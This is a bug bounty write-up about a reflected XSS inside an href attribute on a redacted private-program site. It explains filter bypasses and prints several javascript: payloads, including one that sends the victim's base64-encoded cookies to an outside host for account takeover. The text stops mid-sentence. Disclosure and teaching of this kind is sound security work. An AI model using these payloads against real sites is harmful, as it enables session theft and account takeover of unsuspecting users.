---
title: Rxss inside href attribute - Bypassing lots of weird checks to takeover accounts!
url: https://infosecwriteups.com/rxss-inside-href-attribute-bypassing-lots-of-weird-checks-to-takeover-accounts-b4c8b4e70877?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2023-03-11
fetch_date: 2025-10-04T09:13:46.225405
---

# Rxss inside href attribute - Bypassing lots of weird checks to takeover accounts!

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fb4c8b4e70877&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmarvelmaniac.medium.com%2Frxss-inside-href-attribute-bypassing-lots-of-weird-checks-to-takeover-accounts-b4c8b4e70877&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmarvelmaniac.medium.com%2Frxss-inside-href-attribute-bypassing-lots-of-weird-checks-to-takeover-accounts-b4c8b4e70877&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

# Rxss inside href attribute - Bypassing lots of weird checks to takeover accounts!

[![Ashutosh Dutta](https://miro.medium.com/v2/resize:fill:64:64/1*PQTQzyPXp4QGgU6uAvf5RA.jpeg)](/?source=post_page---byline--b4c8b4e70877---------------------------------------)

[Ashutosh Dutta](/?source=post_page---byline--b4c8b4e70877---------------------------------------)

6 min read

·

Mar 10, 2023

--

Listen

Share

Press enter or click to view image in full size

![]()

Here is the final payload after bypassing all the weird checks —

*javascript://;%250a+alert(document.cookie,%27\\@www.redacted.com/%27)*

In case you are still curious about ***how/why*** this payload and the ***methodology***, make sure to read the write-up till the end where I have explained everything in detail : )

> Background

I was hacking on a private program. It had two assets in scope — *www.redacted.com* and *my.redacted.com* (“redacted” — the word is used in place of the real domain name for privacy concerns as the program was private). I signed up for an account at www.redacted.com with burp suite running in the background. Did some digging. I noticed that a *redirect* parameter is being sent with a lot of endpoints. The program had open redirect in scope(basically they allowed open redirect bug to be reported without any additional impact) and so I tried open redirection but normal methods were not working at all. Just before moving on I tried this as a last resort and strangely it worked — *https://www.redacted.com/x/y?redirect=https://google.com\\@www.redacted.com* redirected to *https://google.com\\@www.redacted.com .* The two backslashes were automatically converted to one forward slash ‘/’ by the browsers.

Okay cool but where is the Rxss ?

Sorry about that, the open redirect bypass was needed to be mentioned as I developed the xss payload somewhat based on it. Though later I realized it was not necessary.

> The Rxss— Finding

Burp Suite was running in the background. All the traffic from *www.redacted.com* was passing through brup. In the ‘http history’ tab(of burp) I noticed this unfamiliar endpoint — https://www.redacted.com/profile/login/form/?redirect=https://redacted.com/ , calling it unfamiliar because the actual login endpoint didn’t have the ‘form’ path. I opened the url in the browser to confirm that its actually uncommon and not the main login page of the domain.

![]()

Tried to open redirect in the ‘redirect’ parameter and noticed that whatever I put as the ‘redirect’ parameter’s value, it was getting reflected in the anchor tags, to be more precise inside the href attribute.

![]()

Press enter or click to view image in full size

![]()

The back-end had basic filtering in place — greater than(>), less than(<), double quotes(“) etc. Were not allowed. Only option left was to check if *javascript:* uri scheme was allowed or not. To my surprise the back-end was not blocking the word ‘javascript’ in the beginning of the urls.

![]()

![]()

But …

1. The redirect parameter value must have two forward slashes after the uri scheme. The uri scheme can be anything(there was no check) but must have ‘*://’* appendedn just after the scheme.
2. The redirect parameter value cannot have two consecutive forward slashes anymore(only once it was allowed).
3. The url must contain the ‘*www.redacted.com’* string in the beginning(just after the two forward slashes) or should contain the string ‘\\@www.redacted.com’ at the end(open redirect bypass).

> The Rxx — bypassing the weird checks

The first problem was a ***problem***because in javascript two forward slashes means single line comment. Thus if we write anything after the two slashes it will not be executed as the browser will treat it as a comment. To overcome that I thought of using newline character. But directly using it as ‘\n’ had no effect. So what I did was url encoding — ‘%0a’ (url encoded new line character). But that didn’t work as well because the server does url decoding of ‘%0a’ to ‘\n’ before reflecting the value in the href attribute.

I then thought of double url encoding because the server only decode it once and as a result the reflected value will be ‘%0a’ this time. The new line character double url encoded looks something like this — ‘*%250a*’. This worked perfectly.

The second problem was that two forwarded slashes cannot be used consecutively again. It was easily bypassed as instead of forward slashes I discovered that backslashes also works the same way.

The third problem was bypassed in two ways basically -

*javascript://www.redacted.com/;%250a+alert(document.cookie)*

Here the ‘*www.redacted.com/;’* stringgets comment out by the two forward slashes and the ‘%250a’ as explained earlier breaks the line and javascript executes the alert function.

*javascript://;%250a+alert(document.cookie,%27\\@www.redacted.com/%27)*

This was the 2nd way where we are taking advantage of the open redirect check flaw. As mentioned in the beginning open redirect check could be bypassed using the ‘\\@’ string in front of the allowed domain. As a result the server allowed the above value for the ‘redirect’ parameter. Here two values are being passed to the alert function separated by commas— *document.cookie* and *‘\\@www.redacted.com’* . The *document.cookie* is executed and for the 2nd value the function returns ‘undefined’. In a nutshell whatever is present first is executed and later one is ignored by the alert function.

> The Rxss — exploitation

The basic *alert(document.cookie)* was ready but that was not enough to say that the impact of this Xss was account takeover. Usually if submitted like this the bug gets triaged as medium severity(on Hackerone specially) so it was important to show how an attacker will takeover accounts.

At this point after bypassing so many weird checks I was not thinking straight. The site *www.redacted.com* had content-security-policy (csp) headers which allowed requests to be sent to only whitelisted domains. And I was thinking of ways to bypass it. One of the ways which came to my mind was posting the cookies of the user publicly in a comment but that needed lot of work(program specific hurdles were present). But! But! A kind person on discord gave me this idea to redirect the victim to the attacker controlled domain with the cookies appended. That was it! It worked smooth AF!

This was the payload used to send the cookies to a remote host —

*javascript://www.redacted.com/;%250adocument.location.href='https:\/\/example.com/'+btoa(document.cookie)*

This is how it got reflected —

Press enter or click to view image in f...